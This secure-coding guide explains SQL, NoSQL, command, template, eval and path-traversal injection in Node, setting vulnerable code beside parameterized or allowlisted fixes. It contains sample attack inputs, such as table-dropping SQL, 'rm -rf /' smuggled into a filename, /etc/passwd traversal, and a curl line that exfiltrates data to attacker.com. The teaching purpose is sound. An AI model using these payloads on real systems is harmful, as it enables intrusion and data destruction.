# Injection Prevention

## SQL Injection Mechanics

SQL injection occurs when user input is concatenated into a SQL string instead of being passed
as a parameter:

```ts
// VULNERABLE — direct concatenation
const query = `SELECT * FROM users WHERE email = '${req.body.email}'`;
// Input: ' OR '1'='1' --
// Result: SELECT * FROM users WHERE email = '' OR '1'='1' --'
// Returns all rows

// Input: '; DROP TABLE users; --
// Destructive query executes
```

The database cannot distinguish between the query structure and the injected data because
they are the same string.

## Parameterized Queries

Parameterized queries (prepared statements) send the query structure and data separately.
The database engine never interprets data as SQL:

```ts
// SAFE — parameterized query
const user = await db.query(
  "SELECT * FROM users WHERE email = $1 AND active = $2",
  [req.body.email, true]
);

// With Knex
const user = await db("users").where({ email: req.body.email, active: true }).first();

// With Prisma — always parameterized automatically
const user = await prisma.user.findFirst({ where: { email: req.body.email } });
```

Always use parameterized queries. There is no exception where string concatenation of
user input into SQL is acceptable.

## ORM Injection Risks

ORMs protect against SQL injection by default, but raw query escape hatches are dangerous:

```ts
// VULNERABLE — raw string with user input in Prisma
const users = await prisma.$queryRawUnsafe(
  `SELECT * FROM users WHERE name = '${req.query.name}'`
);

// SAFE — tagged template literal (Prisma parameterizes this)
const users = await prisma.$queryRaw`SELECT * FROM users WHERE name = ${req.query.name}`;

// VULNERABLE — Knex raw with interpolation
const users = await db.raw(`SELECT * FROM users WHERE role = '${req.query.role}'`);

// SAFE — Knex raw with binding
const users = await db.raw("SELECT * FROM users WHERE role = ?", [req.query.role]);
```

Review every `.raw()`, `$queryRawUnsafe()`, or `whereRaw()` call in your codebase. Each one
is a potential injection point.

## NoSQL Injection (MongoDB)

NoSQL databases have their own injection vectors. MongoDB's `$where` operator executes
JavaScript:

```ts
// VULNERABLE — $where with user input executes arbitrary JS on the server
db.users.find({ $where: `this.username == '${req.body.username}'` });

// VULNERABLE — object injection when input is not validated as a string
// If req.body.password is { $gt: "" }, this matches all users
db.users.findOne({ username: req.body.username, password: req.body.password });

// SAFE — validate that fields are strings before using as query values
const UsernameSchema = z.string().min(1).max(50);
const username = UsernameSchema.parse(req.body.username);
db.users.findOne({ username });
```

Never use `$where`. Validate that all query parameters are the expected primitive type
before passing to MongoDB.

## Command Injection

`child_process` functions that pass user input to a shell interpreter are dangerous:

```ts
import { exec, execFile, spawn } from "child_process";

// VULNERABLE — exec passes the string to /bin/sh
exec(`convert ${req.body.filename} output.png`, callback);
// Input: "file.jpg; rm -rf /" executes both commands

// SAFE — execFile and spawn do not invoke a shell
execFile("convert", [req.body.filename, "output.png"], callback);

// SAFE — spawn with explicit args array
spawn("convert", [req.body.filename, "output.png"], { stdio: "pipe" });
```

Always use `execFile` or `spawn` with an arguments array. If you must use `exec`, sanitize
with a strict allowlist of permitted characters.

## Template Injection

Server-side template injection occurs when user input is rendered as template syntax:

```ts
// VULNERABLE — Handlebars with user-controlled template string
const template = Handlebars.compile(req.body.template);
const output = template({ user });
// Input: "{{#with (lookup . 'constructor')}}" — can escape sandbox

// SAFE — pass user input as data, not as the template
const template = Handlebars.compile("Hello, {{name}}!");
const output = template({ name: req.body.name });
```

Never compile user-supplied strings as templates. Treat user input as data to be rendered
by a fixed template, not as the template itself.

## eval() and Dynamic Code Execution

`eval()`, `new Function()`, `setTimeout(string)`, and `setInterval(string)` execute arbitrary
JavaScript. Never pass user input to them:

```ts
// VULNERABLE
const result = eval(req.body.expression);
const fn = new Function("x", req.body.body);
setTimeout(req.body.callback, 1000);

// SAFE — parse and evaluate with a safe math library instead
import { evaluate } from "mathjs";
const result = evaluate(req.body.expression); // mathjs sandboxes evaluation
```

For user-defined expressions (calculators, formula builders), use a dedicated expression
parsing library that operates on a safe AST rather than executing raw code.

## Second-Order Injection

Second-order injection is stored injection that fires later. The malicious input passes
validation when it enters the system (stored safely) but is used unsafely in a later
operation:

```ts
// Step 1: user registers with username: admin'--
// Stored safely via parameterized query
await db.query("INSERT INTO users (username) VALUES ($1)", ["admin'--"]);

// Step 2: a different code path reads the username and uses it unsafely
const username = user.username; // retrieved from DB: admin'--
const query = `UPDATE users SET role = 'user' WHERE username = '${username}'`;
// Executes: UPDATE users SET role = 'user' WHERE username = 'admin'--'
// The UPDATE silently fails, or worse, matches unintended rows
```

Second-order injection is prevented the same way as first-order: use parameterized queries
everywhere, not just at the entry point.

## Escaping vs Parameterization

Some libraries offer escaping functions as an alternative to parameterization. Always prefer
parameterization:

- Escaping is error-prone — one missed escape function call is a vulnerability
- Escaping is encoding-dependent — multi-byte character set attacks can bypass naive escaping
- Parameterization is structurally safe — data and query are never combined as strings

The only valid use of escaping is for parts of a query that cannot be parameterized, such
as dynamic table names or column names. In that case, use a strict allowlist validation:

```ts
const ALLOWED_SORT_COLUMNS = new Set(["name", "created_at", "email"]);
const sortCol = ALLOWED_SORT_COLUMNS.has(req.query.sort) ? req.query.sort : "created_at";
const users = await db.raw(`SELECT * FROM users ORDER BY ${sortCol} ASC`);
```

## Parameterized Query Examples Across Stacks

### Raw pg (node-postgres)

```ts
import { Pool } from "pg";
const pool = new Pool();

// Positional parameters — $1, $2, ...
const { rows } = await pool.query(
  "SELECT id, email FROM users WHERE tenant_id = $1 AND active = $2",
  [tenantId, true]
);

// Multi-row insert
const values = users.map((_, i) => `($${i * 2 + 1}, $${i * 2 + 2})`).join(", ");
const flat = users.flatMap((u) => [u.email, u.role]);
await pool.query(`INSERT INTO users (email, role) VALUES ${values}`, flat);
```

### Drizzle ORM

```ts
import { db } from "./db";
import { users } from "./schema";
import { eq, and } from "drizzle-orm";

// Automatic parameterization — Drizzle never interpolates user input
const result = await db
  .select()
  .from(users)
  .where(and(eq(users.tenantId, tenantId), eq(users.active, true)));

// Raw SQL escape hatch — use sql tag, not string interpolation
import { sql } from "drizzle-orm";
const result = await db.execute(
  sql`SELECT * FROM users WHERE email = ${email}` // parameterized
);
```

### Prisma

```ts
// ORM layer — always parameterized
const user = await prisma.user.findFirst({
  where: { email: req.body.email, tenantId },
});

// Raw query with tagged template — Prisma wraps in prepared statement
const users = await prisma.$queryRaw`
  SELECT id, email FROM users
  WHERE tenant_id = ${tenantId} AND created_at > ${since}
`;

// NEVER use $queryRawUnsafe with user input:
// const users = await prisma.$queryRawUnsafe(`SELECT * WHERE email='${email}'`); // VULNERABLE
```

## Path Traversal Prevention

Path traversal (directory traversal) allows reading files outside the intended directory
by using `../` sequences:

```
GET /files?name=../../etc/passwd
GET /files?name=..%2F..%2Fetc%2Fshadow   (URL-encoded variant)
```

```ts
import path from "path";
import fs from "fs/promises";

const BASE_DIR = "/app/uploads";

async function serveFile(fileName: string): Promise<Buffer> {
  // Resolve to absolute path — this expands all ../ traversal
  const resolved = path.resolve(BASE_DIR, fileName);

  // Reject if the resolved path escapes the base directory
  if (!resolved.startsWith(BASE_DIR + path.sep) && resolved !== BASE_DIR) {
    throw new Error("Path traversal attempt detected");
  }

  return fs.readFile(resolved);
}
```

Additional guards: strip null bytes (`\0`), reject Windows-style separators (`\`) on
non-Windows hosts, and validate the file extension against an allowlist before any read.

## Template Injection: EJS Unsafe Patterns

EJS is commonly misconfigured in Express when `render` is called with user-supplied
template strings or when `<%=` vs `<%-` is confused:

```ts
// VULNERABLE — renders user input as raw HTML (unescaped)
res.render("page", { content: req.body.html }); // template: <%- content %>

// SAFE — auto-escapes HTML entities
// template: <%= content %>  → escapes < > & " '

// CRITICALLY VULNERABLE — user controls the template path
res.render(req.query.view, { user });
// Input: ../../../etc/passwd   → reads arbitrary files
// Always use a fixed template name:
const ALLOWED_VIEWS = new Set(["home", "dashboard", "profile"]);
const view = ALLOWED_VIEWS.has(req.query.view) ? req.query.view : "home";
res.render(view, { user });
```

Handlebars: never pass `{ allowProtoPropertiesByDefault: true }` — it enables prototype
pollution. Use `allowedProtoProperties` to allowlist specific keys instead.

## Real-World CVE Patterns (Anonymized)

These are composite patterns from public CVE disclosures, illustrating injection impact:

**Pattern A — ORM raw escape hatch in search:** A search endpoint allowed sorting by
user-supplied column name. The column was not allowlisted and was concatenated into a
`ORDER BY` clause via `db.raw()`. Attackers extracted the entire database schema and user
table via time-based blind injection. Fix: allowlist of permitted sort columns.

**Pattern B — MongoDB operator injection in login:** A REST API passed `req.body` directly
to `findOne({ username, password })`. Sending `{ "password": { "$gt": "" } }` matched all
users without knowing the password. Accounts were taken over at scale. Fix: Zod/joi schema
validation that coerces inputs to strings before any DB call.

**Pattern C — Second-order in username change flow:** A user set their username to
`admin'--` at registration (safely stored). A password-reset flow later composed a raw
query using the stored username. The injected suffix commented out the `WHERE` clause,
resetting the admin's password. Fix: parameterized queries at every usage site, not only
entry points.

**Pattern D — Command injection via filename upload:** An image processing service ran
`exec("convert " + filename + " out.png")`. Uploading a file named
`file.jpg; curl https://attacker.com/$(whoami)` exfiltrated the service account name.
Fix: `execFile("convert", [filename, "out.png"])` — no shell expansion.

## Input Validation as Defense-in-Depth

Parameterization prevents injection structurally, but input validation reduces the blast
radius when new code paths are introduced:

```ts
import { z } from "zod";

// Define strict schemas at the boundary
const SearchParams = z.object({
  query: z.string().min(1).max(200).regex(/^[\w\s\-.,]+$/),
  page: z.coerce.number().int().min(1).max(1000).default(1),
  sortBy: z.enum(["name", "created_at", "email"]),
  tenantId: z.string().uuid(),
});

app.get("/search", async (req, res) => {
  const params = SearchParams.safeParse(req.query);
  if (!params.success) {
    return res.status(400).json({ errors: params.error.flatten() });
  }
  // params.data is now typed and constrained
  const results = await searchUsers(params.data);
  res.json(results);
});
```

Validate at the outermost layer (HTTP handler), not inside the repository or service.
Never re-validate deep in the stack and assume the outer layer has already done it.